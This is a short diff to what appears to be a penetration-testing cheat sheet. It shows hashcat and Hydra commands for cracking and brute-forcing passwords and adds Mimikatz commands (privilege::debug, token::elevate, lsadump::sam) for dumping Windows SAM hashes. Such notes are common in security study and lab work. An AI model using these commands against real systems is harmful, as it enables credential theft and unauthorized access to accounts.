@@ -185,3 +185,12 @@ Hashcat: `hashcat -a 0 -m 13400 pass.txt /home/kali/rockyou.txt -r /home/kali/Do
 ## Password Guessing
 
 Hydra HTTP Post: `hydra -l admin -P /home/kali/rockyou.txt 192.168.245.89 http-post-form "/wp-login:log=^USER^&pwd=^PASS^:S=302"`
+
+## NTLM & Mimikatz
+
+Powershell commands to extract hashes:
+```
+privilege::debug
+token::elevate
+lsadump::sam
+```
